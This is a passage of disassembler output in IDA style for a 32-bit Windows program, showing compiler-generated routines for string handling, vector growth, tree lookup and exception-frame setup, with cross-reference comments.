loc_408544:                             ; CODE XREF: sub_41EA09-164D3↑j
                mov     [esi+14h], ebx
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+4], bl
                pop     ebx
                retn
; END OF FUNCTION CHUNK FOR sub_41EA09
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408560      proc near               ; CODE XREF: sub_4052B0+409↑p
                                        ; sub_406C90+1F9↑p ...

arg_0           = dword ptr  4

                mov     edx, [esp+arg_0]
                push    esi
                mov     esi, ecx
                mov     eax, edx
                push    edi
                mov     dword ptr [esi+18h], 0Fh
                mov     dword ptr [esi+14h], 0
                mov     byte ptr [esi+4], 0
                lea     edi, [eax+1]
                nop

loc_408580:                             ; CODE XREF: sub_408560+25↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_408580
                sub     eax, edi
                push    eax
                push    edx
                mov     ecx, esi
                call    sub_409840
                pop     edi
                mov     eax, esi
                pop     esi
                retn    4
sub_408560      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4085A0      proc near               ; CODE XREF: sub_40A030+255↓p
                                        ; sub_40A030+306↓p

arg_0           = dword ptr  4

                push    esi
                xor     eax, eax
                mov     esi, ecx
                push    0FFFFFFFFh
                mov     [esi+14h], eax
                mov     dword ptr [esi+18h], 0Fh
                push    eax
                mov     [esi+4], al
                mov     eax, [esp+0Ch+arg_0]
                push    eax
                call    sub_408CA0
                mov     eax, esi
                pop     esi
                retn    4
sub_4085A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4085D0      proc near               ; CODE XREF: sub_401E10+686↑p
                                        ; sub_4052B0+423↑p ...
                push    esi
                mov     esi, ecx
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_4085E5
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_4085E5:                             ; CODE XREF: sub_4085D0+7↑j
                xor     eax, eax
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], eax
                mov     [esi+4], al
                pop     esi
                retn
sub_4085D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408600      proc near               ; CODE XREF: sub_407940+1A7↑p
                                        ; sub_407940+1C7↑p

var_4           = dword ptr -4
arg_0           = dword ptr  4

                push    ecx
                xor     eax, eax
                mov     [esi+14h], eax
                mov     dword ptr [esi+18h], 0Fh
                mov     [esp+4+var_4], eax
                mov     [esi+4], al
                mov     eax, [esp+4+arg_0]
                push    eax
                push    ecx
                push    edx
                mov     ecx, esi
                call    sub_408CA0
                mov     eax, esi
                pop     ecx
                retn    4
sub_408600      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408630      proc near               ; CODE XREF: sub_41F210↓p

var_C           = dword ptr -0Ch

                push    0FFFFFFFFh
                push    offset SEH_408630
                mov     eax, large fs:0
                push    eax
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+10h+var_C]
                mov     large fs:0, eax
                push    4
                call    sub_40F94F
                xor     ecx, ecx
                add     esp, 4
                cmp     eax, ecx
                jz      short loc_408668
                mov     dword ptr [eax], offset dword_42C8B0
                jmp     short loc_40866A
; ---------------------------------------------------------------------------

loc_408668:                             ; CODE XREF: sub_408630+2E↑j
                xor     eax, eax

loc_40866A:                             ; CODE XREF: sub_408630+36↑j
                mov     dword_42C8B0, eax
                mov     dword_42C8BC, ecx
                mov     dword_42C8C0, ecx
                mov     dword_42C8C4, ecx
                mov     eax, offset dword_42C8B0
                mov     ecx, [esp+10h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                add     esp, 0Ch
                retn
sub_408630      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4086A0      proc near               ; CODE XREF: sub_403F70+126↑p

var_C           = dword ptr -0Ch

                sub     esp, 0Ch
                push    esi
                push    edi
                mov     edi, dword_42C8BC
                test    edi, edi
                jnz     short loc_4086B3
                xor     ecx, ecx
                jmp     short loc_4086CC
; ---------------------------------------------------------------------------

loc_4086B3:                             ; CODE XREF: sub_4086A0+D↑j
                mov     ecx, dword_42C8C4
                sub     ecx, edi
                mov     eax, 2AAAAAABh
                imul    ecx
                sar     edx, 2
                mov     ecx, edx
                shr     ecx, 1Fh
                add     ecx, edx

loc_4086CC:                             ; CODE XREF: sub_4086A0+11↑j
                mov     esi, dword_42C8C0
                mov     edx, esi
                sub     edx, edi
                mov     eax, 2AAAAAABh
                imul    edx
                sar     edx, 2
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                cmp     eax, ecx
                jnb     short loc_408718
                mov     byte ptr [esp+14h+var_C], 0
                mov     ecx, [esp+14h+var_C]
                mov     edx, [esp+14h+var_C]
                push    ecx
                push    edx
                push    ebx
                push    esi
                mov     ecx, 1
                call    sub_40B050
                add     esp, 10h
                add     esi, 18h
                mov     dword_42C8C0, esi
                pop     edi
                pop     esi
                add     esp, 0Ch
                retn
; ---------------------------------------------------------------------------

loc_408718:                             ; CODE XREF: sub_4086A0+49↑j
                cmp     edi, esi
                jbe     short loc_408721
                call    sub_40EC7A

loc_408721:                             ; CODE XREF: sub_4086A0+7A↑j
                mov     eax, dword_42C8B0
                push    esi
                push    eax
                push    ebx
                lea     eax, [esp+20h+var_C]
                push    eax
                call    sub_408E50
                pop     edi
                pop     esi
                add     esp, 0Ch
                retn
sub_4086A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_408740      proc near               ; CODE XREF: sub_403B80+182↑p
                                        ; sub_4099D0+22C↓p ...

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_408740
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     ebx, ecx
                mov     esi, [ebp+arg_0]
                push    4
                call    sub_40F94F
                add     esp, 4
                test    eax, eax
                jz      short loc_408782
                mov     [eax], esi
                jmp     short loc_408784
; ---------------------------------------------------------------------------

loc_408782:                             ; CODE XREF: sub_408740+3C↑j
                xor     eax, eax

loc_408784:                             ; CODE XREF: sub_408740+40↑j
                mov     [esi], eax
                mov     [ebp+var_4], 0
                mov     ecx, [ebx+10h]
                sub     ecx, [ebx+0Ch]
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     edi, edx
                mov     eax, 0
                shr     edi, 1Fh
                add     edi, edx
                mov     [esi+0Ch], eax
                mov     [esi+10h], eax
                mov     [esi+14h], eax
                jz      short loc_408821
                cmp     edi, 9249249h
                jbe     short loc_4087C3
                call    sub_40A3B0
; ---------------------------------------------------------------------------

loc_4087C3:                             ; CODE XREF: sub_408740+7C↑j
                mov     ecx, edi
                call    sub_409FA0
                lea     ecx, ds:0[edi*8]
                sub     ecx, edi
                lea     edx, [eax+ecx*4]
                mov     [esi+0Ch], eax
                mov     [esi+10h], eax
                mov     [esi+14h], edx
                mov     byte ptr [ebp+var_4], 1
                mov     eax, [ebx+10h]
                mov     [ebp+var_18], eax
                cmp     [ebx+0Ch], eax
                jbe     short loc_4087F3
                call    sub_40EC7A

loc_4087F3:                             ; CODE XREF: sub_408740+AC↑j
                mov     edi, [ebx+0Ch]
                cmp     edi, [ebx+10h]
                jbe     short loc_408800
                call    sub_40EC7A

loc_408800:                             ; CODE XREF: sub_408740+B9↑j
                mov     edx, [ebp+arg_0]
                mov     eax, [esi+0Ch]
                mov     byte ptr [ebp+var_14], 0
                mov     ecx, [ebp+var_14]
                push    ecx
                push    edx
                push    eax
                mov     eax, [ebp+var_18]
                push    eax
                mov     ecx, edi
                call    sub_40B4E0
                add     esp, 10h
                mov     [esi+10h], eax

loc_408821:                             ; CODE XREF: sub_408740+74↑j
                mov     eax, esi
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_408837:                             ; DATA XREF: .rdata:stru_4237A8↓o
                mov     esi, [ebp+arg_0]
                call    sub_4091B0
                push    0
                push    0
                call    sub_41032B
sub_408740      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408850      proc near               ; CODE XREF: sub_403F70+92↑p
                                        ; sub_403F70+F9↑p

var_8           = dword ptr -8
arg_0           = dword ptr  4

                sub     esp, 0Ch
                push    ebp
                mov     ebp, [ebx+0Ch]
                push    esi
                push    edi
                test    ebp, ebp
                jnz     short loc_408861
                xor     esi, esi
                jmp     short loc_408879
; ---------------------------------------------------------------------------

loc_408861:                             ; CODE XREF: sub_408850+B↑j
                mov     ecx, [ebx+14h]
                sub     ecx, ebp
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     esi, edx
                shr     esi, 1Fh
                add     esi, edx

loc_408879:                             ; CODE XREF: sub_408850+F↑j
                mov     edi, [ebx+10h]
                mov     ecx, edi
                sub     ecx, ebp
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                cmp     eax, esi
                jnb     short loc_4088C8
                mov     edx, [esp+18h+arg_0]
                mov     eax, [esp+18h+arg_0]
                mov     byte ptr [esp+18h+var_8], 0
                mov     ecx, [esp+18h+var_8]
                push    ecx
                push    edx
                push    eax
                push    edi
                mov     ecx, 1
                call    sub_40B0E0
                add     esp, 10h
                add     edi, 1Ch
                mov     [ebx+10h], edi
                pop     edi
                pop     esi
                pop     ebp
                add     esp, 0Ch
                retn    4
; ---------------------------------------------------------------------------

loc_4088C8:                             ; CODE XREF: sub_408850+45↑j
                cmp     ebp, edi
                jbe     short loc_4088D1
                call    sub_40EC7A

loc_4088D1:                             ; CODE XREF: sub_408850+7A↑j
                mov     eax, [ebx]
                mov     ecx, [esp+18h+arg_0]
                push    edi
                push    eax
                push    ecx
                lea     edx, [esp+24h+var_8]
                push    edx
                mov     eax, ebx
                call    sub_4090A0
                pop     edi
                pop     esi
                pop     ebp
                add     esp, 0Ch
                retn    4
sub_408850      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_4088F0      proc near               ; CODE XREF: sub_407940+315↑p
                                        ; sub_407940+486↑p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch

                sub     esp, 18h
                push    ebx
                mov     ebx, [esp+1Ch+arg_4]
                push    ebp
                mov     ebp, [esp+20h+arg_0]
                mov     eax, [ebp+18h]
                push    esi
                push    edi
                mov     edi, [eax+4]
                cmp     byte ptr [edi+45h], 0
                mov     ecx, eax
                mov     al, 1
                mov     [esp+28h+var_18], ecx
                mov     byte ptr [esp+28h+var_14], al
                jnz     loc_408A1A
                mov     esi, [esp+28h+arg_8]
                mov     eax, [esi+14h]
                mov     ecx, [esi+18h]
                mov     [esp+28h+var_C], eax
                mov     [esp+28h+var_10], eax
                mov     [esp+28h+var_8], ecx
                jmp     short loc_40893B
; ---------------------------------------------------------------------------

loc_408933:                             ; CODE XREF: sub_4088F0+11C↓j
                mov     esi, [esp+28h+arg_8]
                mov     eax, [esp+28h+var_10]

loc_40893B:                             ; CODE XREF: sub_4088F0+41↑j
                cmp     dword ptr [edi+24h], 10h
                mov     edx, [edi+20h]
                mov     [esp+28h+var_18], edi
                jb      short loc_40894D
                mov     ecx, [edi+10h]
                jmp     short loc_408950
; ---------------------------------------------------------------------------

loc_40894D:                             ; CODE XREF: sub_4088F0+56↑j
                lea     ecx, [edi+10h]

loc_408950:                             ; CODE XREF: sub_4088F0+5B↑j
                mov     ebp, [esp+28h+var_C]
                cmp     eax, ebp
                jnb     short loc_40895A
                mov     ebp, eax

loc_40895A:                             ; CODE XREF: sub_4088F0+66↑j
                cmp     ebp, edx
                jnb     short loc_408960
                mov     edx, ebp

loc_408960:                             ; CODE XREF: sub_4088F0+6C↑j
                cmp     [esp+28h+var_8], 10h
                jb      short loc_40896E
                lea     eax, [esi+4]
                mov     esi, [eax]
                jmp     short loc_408971
; ---------------------------------------------------------------------------

loc_40896E:                             ; CODE XREF: sub_4088F0+75↑j
                add     esi, 4

loc_408971:                             ; CODE XREF: sub_4088F0+7C↑j
                cmp     edx, 4
                jb      short loc_40898A

loc_408976:                             ; CODE XREF: sub_4088F0+98↓j
                mov     eax, [esi]
                cmp     eax, [ecx]
                jnz     short loc_40898E
                sub     edx, 4
                add     ecx, 4
                add     esi, 4
                cmp     edx, 4
                jnb     short loc_408976

loc_40898A:                             ; CODE XREF: sub_4088F0+84↑j
                test    edx, edx
                jz      short loc_4089D9

loc_40898E:                             ; CODE XREF: sub_4088F0+8A↑j
                movzx   eax, byte ptr [esi]
                movzx   ebx, byte ptr [ecx]
                sub     eax, ebx
                jnz     short loc_4089C9
                cmp     edx, 1
                jbe     short loc_4089D5
                movzx   eax, byte ptr [esi+1]
                movzx   ebx, byte ptr [ecx+1]
                sub     eax, ebx
                jnz     short loc_4089C9
                cmp     edx, 2
                jbe     short loc_4089D5
                movzx   eax, byte ptr [esi+2]
                movzx   ebx, byte ptr [ecx+2]
                sub     eax, ebx
                jnz     short loc_4089C9
                cmp     edx, 3
                jbe     short loc_4089D5
                movzx   eax, byte ptr [esi+3]
                movzx   ecx, byte ptr [ecx+3]
                sub     eax, ecx

loc_4089C9:                             ; CODE XREF: sub_4088F0+A6↑j
                                        ; sub_4088F0+B7↑j ...
                mov     ebx, [esp+28h+arg_4]
                sar     eax, 1Fh
                or      eax, 1
                jmp     short loc_4089DB
; ---------------------------------------------------------------------------

loc_4089D5:                             ; CODE XREF: sub_4088F0+AB↑j
                                        ; sub_4088F0+BC↑j ...
                mov     ebx, [esp+28h+arg_4]

loc_4089D9:                             ; CODE XREF: sub_4088F0+9C↑j
                xor     eax, eax

loc_4089DB:                             ; CODE XREF: sub_4088F0+E3↑j
                test    eax, eax
                jnz     short loc_4089F6
                mov     eax, [edi+20h]
                cmp     ebp, eax
                jnb     short loc_4089EB
                or      eax, 0FFFFFFFFh
                jmp     short loc_4089F4
; ---------------------------------------------------------------------------

loc_4089EB:                             ; CODE XREF: sub_4088F0+F4↑j
                xor     edx, edx
                cmp     ebp, eax
                setnz   dl
                mov     eax, edx

loc_4089F4:                             ; CODE XREF: sub_4088F0+F9↑j
                test    eax, eax

loc_4089F6:                             ; CODE XREF: sub_4088F0+ED↑j
                setl    al
                mov     byte ptr [esp+28h+var_14], al
                test    al, al
                jz      short loc_408A05
                mov     edi, [edi]
                jmp     short loc_408A08
; ---------------------------------------------------------------------------

loc_408A05:                             ; CODE XREF: sub_4088F0+10F↑j
                mov     edi, [edi+8]

loc_408A08:                             ; CODE XREF: sub_4088F0+113↑j
                cmp     byte ptr [edi+45h], 0
                jz      loc_408933
                mov     ebp, [esp+28h+arg_0]
                mov     ecx, [esp+28h+var_18]

loc_408A1A:                             ; CODE XREF: sub_4088F0+25↑j
                mov     esi, [ebp+0]
                mov     edi, ecx
                mov     [esp+28h+var_4], edi
                mov     [esp+28h+var_8], esi
                test    al, al
                jz      short loc_408A82
                mov     eax, [ebp+18h]
                mov     edi, [eax]
                test    esi, esi
                jz      short loc_408A38
                cmp     esi, esi
                jz      short loc_408A41

loc_408A38:                             ; CODE XREF: sub_4088F0+142↑j
                call    sub_40EC7A
                mov     ecx, [esp+28h+var_18]

loc_408A41:                             ; CODE XREF: sub_4088F0+146↑j
                cmp     ecx, edi
                jnz     short loc_408A71
                mov     edx, [esp+28h+arg_8]
                push    edx
                push    1
                lea     eax, [esp+30h+var_8]
                push    eax

loc_408A51:                             ; CODE XREF: sub_4088F0+1B5↓j
                push    ebp
                call    sub_4092F0
                mov     ecx, [eax]
                mov     edx, [eax+4]
                mov     [ebx], ecx
                mov     [ebx+4], edx
                mov     byte ptr [ebx+8], 1
                mov     eax, ebx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 18h
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408A71:                             ; CODE XREF: sub_4088F0+153↑j
                lea     esi, [esp+28h+var_8]
                call    sub_40AD80
                mov     edi, [esp+28h+var_4]
                mov     esi, [esp+28h+var_8]

loc_408A82:                             ; CODE XREF: sub_4088F0+139↑j
                mov     eax, [esp+28h+arg_8]
                lea     edx, [edi+0Ch]
                call    sub_4095C0
                test    al, al
                jz      short loc_408AA7
                mov     eax, [esp+28h+arg_8]
                mov     ecx, [esp+28h+var_14]
                push    eax
                push    ecx
                mov     ecx, [esp+30h+var_18]
                lea     edx, [esp+30h+var_8]
                push    edx
                jmp     short loc_408A51
; ---------------------------------------------------------------------------

loc_408AA7:                             ; CODE XREF: sub_4088F0+1A0↑j
                mov     [ebx+4], edi
                pop     edi
                mov     [ebx], esi
                pop     esi
                pop     ebp
                mov     byte ptr [ebx+8], 0
                mov     eax, ebx
                pop     ebx
                add     esp, 18h
                retn    0Ch
sub_4088F0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408AC0      proc near               ; CODE XREF: sub_407940+5A0↑p
                                        ; sub_407940+6EF↑p ...

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
arg_0           = dword ptr  4
arg_4           = dword ptr  8

                sub     esp, 18h
                push    ebx
                push    ebp
                mov     ebp, [esp+20h+arg_4]
                push    edi
                mov     ecx, ebp
                mov     eax, esi
                call    sub_40A580
                mov     ebx, eax
                mov     [esp+24h+var_10], ebx
                test    esi, esi
                jnz     short loc_408AE2
                call    sub_40EC7A

loc_408AE2:                             ; CODE XREF: sub_408AC0+1B↑j
                mov     eax, [esi]
                mov     edi, [esi+18h]
                mov     [esp+24h+var_14], eax
                test    eax, eax
                jz      short loc_408AF3
                cmp     eax, eax
                jz      short loc_408AF8

loc_408AF3:                             ; CODE XREF: sub_408AC0+2D↑j
                call    sub_40EC7A

loc_408AF8:                             ; CODE XREF: sub_408AC0+31↑j
                cmp     ebx, edi
                jz      short loc_408B10
                lea     eax, [ebx+0Ch]
                mov     edx, ebp
                call    sub_4095C0
                test    al, al
                jnz     short loc_408B10
                lea     eax, [esp+24h+var_14]
                jmp     short loc_408B21
; ---------------------------------------------------------------------------

loc_408B10:                             ; CODE XREF: sub_408AC0+3A↑j
                                        ; sub_408AC0+48↑j
                mov     eax, [esi+18h]
                mov     ecx, [esi]
                mov     [esp+24h+var_8], eax
                mov     [esp+24h+var_C], ecx
                lea     eax, [esp+24h+var_C]

loc_408B21:                             ; CODE XREF: sub_408AC0+4E↑j
                mov     edx, [eax]
                mov     ecx, [esp+24h+arg_0]
                mov     eax, [eax+4]
                pop     edi
                pop     ebp
                mov     [ecx+4], eax
                mov     [ecx], edx
                mov     eax, ecx
                pop     ebx
                add     esp, 18h
                retn    8
sub_408AC0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408B40      proc near               ; CODE XREF: sub_407940+887↑p
                                        ; sub_407940+8AF↑p ...
                mov     eax, [esi]
                test    eax, eax
                jnz     short loc_408B51
                call    sub_40EC7A
                mov     eax, [esi]
                test    eax, eax
                jz      short loc_408B55

loc_408B51:                             ; CODE XREF: sub_408B40+4↑j
                mov     eax, [eax]
                jmp     short loc_408B57
; ---------------------------------------------------------------------------

loc_408B55:                             ; CODE XREF: sub_408B40+F↑j
                xor     eax, eax

loc_408B57:                             ; CODE XREF: sub_408B40+13↑j
                mov     ecx, [esi+4]
                cmp     ecx, [eax+18h]
                jnz     short loc_408B64
                call    sub_40EC7A

loc_408B64:                             ; CODE XREF: sub_408B40+1D↑j
                mov     eax, [esi+4]
                add     eax, 0Ch
                retn
sub_408B40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408B70      proc near               ; CODE XREF: sub_407940+2E2↑p
                                        ; sub_407940+453↑p

var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch

                push    0FFFFFFFFh
                push    offset SEH_40AEF0
                mov     eax, large fs:0
                push    eax
                push    ebx
                push    esi
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+18h+var_C]
                mov     large fs:0, eax
                mov     esi, [esp+18h+arg_0]
                mov     eax, [esp+18h+arg_4]
                xor     ebx, ebx
                push    0FFFFFFFFh
                push    ebx
                mov     dword ptr [esi+18h], 0Fh
                mov     [esi+14h], ebx
                push    eax
                mov     ecx, esi
                mov     [esi+4], bl
                call    sub_408CA0
                mov     edx, [esp+18h+arg_8]
                push    0FFFFFFFFh
                lea     ecx, [esi+1Ch]
                mov     [esp+1Ch+var_4], ebx
                push    ebx
                mov     dword ptr [ecx+18h], 0Fh
                mov     [ecx+14h], ebx
                push    edx
                mov     [ecx+4], bl
                call    sub_408CA0
                mov     eax, esi
                mov     ecx, [esp+18h+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     esi
                pop     ebx
                add     esp, 0Ch
                retn    0Ch
sub_408B70      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408BF0      proc near               ; CODE XREF: sub_41E980↓j
                mov     eax, dword_42C8B0
                push    eax
                call    sub_40F15B
                pop     ecx
                retn
sub_408BF0      endp

; ---------------------------------------------------------------------------
                align 10h
; START OF FUNCTION CHUNK FOR sub_41E6C0
;   ADDITIONAL PARENT FUNCTION sub_41E950
;   ADDITIONAL PARENT FUNCTION sub_41E9A0
;   ADDITIONAL PARENT FUNCTION sub_41E9DD
;   ADDITIONAL PARENT FUNCTION sub_41F170
;   ADDITIONAL PARENT FUNCTION sub_41F1D0

loc_408C00:                             ; CODE XREF: sub_41E6C0+3↓j
                                        ; sub_41E950+3↓j ...
                mov     ecx, [eax]
                push    ecx
                call    sub_40F15B
                pop     ecx
                retn
; END OF FUNCTION CHUNK FOR sub_41E6C0
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408C10      proc near               ; CODE XREF: sub_401E10+421↑p
                                        ; sub_402A00+10C↑p ...
                or      eax, 0FFFFFFFFh
                sub     eax, [esi+14h]
                cmp     eax, 1
                ja      short loc_408C20
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_408C20:                             ; CODE XREF: sub_408C10+9↑j
                push    edi
                mov     edi, [esi+14h]
                inc     edi
                cmp     edi, 0FFFFFFFEh
                jbe     short loc_408C2F
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_408C2F:                             ; CODE XREF: sub_408C10+18↑j
                mov     eax, [esi+18h]
                cmp     eax, edi
                jnb     short loc_408C5B
                mov     ecx, [esi+14h]
                push    ecx
                push    edi
                mov     ecx, esi
                call    sub_40A7D0
                test    edi, edi

loc_408C44:                             ; CODE XREF: sub_408C10+4D↓j
                jbe     short loc_408C8F
                mov     edx, 10h
                push    ebp
                mov     ebp, [esi+14h]
                lea     eax, [esi+4]
                cmp     [esi+18h], edx
                jb      short loc_408C7B
                mov     ecx, [eax]
                jmp     short loc_408C7D
; ---------------------------------------------------------------------------

loc_408C5B:                             ; CODE XREF: sub_408C10+24↑j
                test    edi, edi
                jnz     short loc_408C44
                mov     [esi+14h], edi
                cmp     eax, 10h
                jb      short loc_408C71
                mov     eax, [esi+4]
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     edi
                retn
; ---------------------------------------------------------------------------

loc_408C71:                             ; CODE XREF: sub_408C10+55↑j
                lea     eax, [esi+4]
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     edi
                retn
; ---------------------------------------------------------------------------

loc_408C7B:                             ; CODE XREF: sub_408C10+45↑j
                mov     ecx, eax

loc_408C7D:                             ; CODE XREF: sub_408C10+49↑j
                mov     [ecx+ebp], bl
                mov     [esi+14h], edi
                pop     ebp
                cmp     [esi+18h], edx
                jb      short loc_408C8B
                mov     eax, [eax]

loc_408C8B:                             ; CODE XREF: sub_408C10+77↑j
                mov     byte ptr [eax+edi], 0

loc_408C8F:                             ; CODE XREF: sub_408C10:loc_408C44↑j
                mov     eax, esi
                pop     edi
                retn
sub_408C10      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408CA0      proc near               ; CODE XREF: sub_4010D0+51↑p
                                        ; sub_401240+56↑p ...

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch

                push    ebx
                mov     ebx, [esp+4+arg_0]
                push    ebp
                mov     ebp, [esp+8+arg_4]
                push    esi
                push    edi
                mov     esi, ecx
                cmp     [ebx+14h], ebp
                jnb     short loc_408CB8
                call    sub_40E2A3
; ---------------------------------------------------------------------------

loc_408CB8:                             ; CODE XREF: sub_408CA0+11↑j
                mov     edi, [ebx+14h]
                mov     eax, [esp+10h+arg_8]
                sub     edi, ebp
                cmp     eax, edi
                jnb     short loc_408CC7
                mov     edi, eax

loc_408CC7:                             ; CODE XREF: sub_408CA0+23↑j
                cmp     esi, ebx
                jnz     short loc_408CEA
                push    0FFFFFFFFh
                add     edi, ebp
                push    edi
                mov     ecx, esi
                call    sub_409920
                push    ebp
                push    0
                mov     ecx, esi
                call    sub_409920
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408CEA:                             ; CODE XREF: sub_408CA0+29↑j
                cmp     edi, 0FFFFFFFEh
                jbe     short loc_408CF4
                call    sub_40E26B
; ---------------------------------------------------------------------------

loc_408CF4:                             ; CODE XREF: sub_408CA0+4D↑j
                mov     eax, [esi+18h]
                cmp     eax, edi
                jnb     short loc_408D16
                mov     eax, [esi+14h]
                push    eax
                push    edi
                mov     ecx, esi
                call    sub_40A7D0
                test    edi, edi

loc_408D09:                             ; CODE XREF: sub_408CA0+78↓j
                jbe     short loc_408D71
                cmp     dword ptr [ebx+18h], 10h
                jb      short loc_408D40
                mov     edx, [ebx+4]
                jmp     short loc_408D43
; ---------------------------------------------------------------------------

loc_408D16:                             ; CODE XREF: sub_408CA0+59↑j
                test    edi, edi
                jnz     short loc_408D09
                mov     [esi+14h], edi
                cmp     eax, 10h
                jb      short loc_408D31
                mov     eax, [esi+4]
                pop     edi
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408D31:                             ; CODE XREF: sub_408CA0+80↑j
                lea     eax, [esi+4]
                pop     edi
                mov     byte ptr [eax], 0
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408D40:                             ; CODE XREF: sub_408CA0+6F↑j
                lea     edx, [ebx+4]

loc_408D43:                             ; CODE XREF: sub_408CA0+74↑j
                mov     ecx, [esi+18h]
                lea     ebx, [esi+4]
                cmp     ecx, 10h
                jb      short loc_408D52
                mov     eax, [ebx]
                jmp     short loc_408D54
; ---------------------------------------------------------------------------

loc_408D52:                             ; CODE XREF: sub_408CA0+AC↑j
                mov     eax, ebx

loc_408D54:                             ; CODE XREF: sub_408CA0+B0↑j
                push    edi
                add     edx, ebp
                push    edx
                push    ecx
                push    eax
                call    sub_40F166
                add     esp, 10h
                cmp     dword ptr [esi+18h], 10h
                mov     [esi+14h], edi
                jb      short loc_408D6D
                mov     ebx, [ebx]

loc_408D6D:                             ; CODE XREF: sub_408CA0+C9↑j
                mov     byte ptr [ebx+edi], 0

loc_408D71:                             ; CODE XREF: sub_408CA0:loc_408D09↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebp
                pop     ebx
                retn    0Ch
sub_408CA0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_408D80      proc near               ; CODE XREF: sub_404E40+F4↑p
                                        ; sub_407940+186↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch

                mov     ecx, [esp+arg_8]
                push    ebp
                mov     ebp, [esp+4+arg_4]
                test    ecx, ecx
                jnz     short loc_408D93
                xor     eax, eax
                pop     ebp
                retn    0Ch
; ---------------------------------------------------------------------------

loc_408D93:                             ; CODE XREF: sub_408D80+B↑j
                mov     eax, [esp+4+arg_0]
                push    ebx
                push    esi
                push    edi
                mov     edi, [eax+14h]
                test    edi, edi
                jbe     short loc_408E0F
                cmp     ecx, edi
                ja      short loc_408E0F
                mov     edx, 1
                sub     edx, ecx
                add     edi, edx
                cmp     dword ptr [eax+18h], 10h
                jb      short loc_408DC0
                mov     ebx, [eax+4]
                add     eax, 4
                mov     [esp+10h+arg_4], eax
                jmp     short loc_408DC7
; ---------------------------------------------------------------------------

loc_408DC0:                             ; CODE XREF: sub_408D80+32↑j
                lea     ebx, [eax+4]
                mov     [esp+10h+arg_4], ebx

loc_408DC7:                             ; CODE XREF: sub_408D80+3E↑j
                movsx   eax, byte ptr [ebp+0]
                push    edi
                push    eax
                push    ebx
                call    sub_40E760
                mov     esi, eax
                add     esp, 0Ch
                test    esi, esi
                jz      short loc_408E0F
                lea     esp, [esp+0]

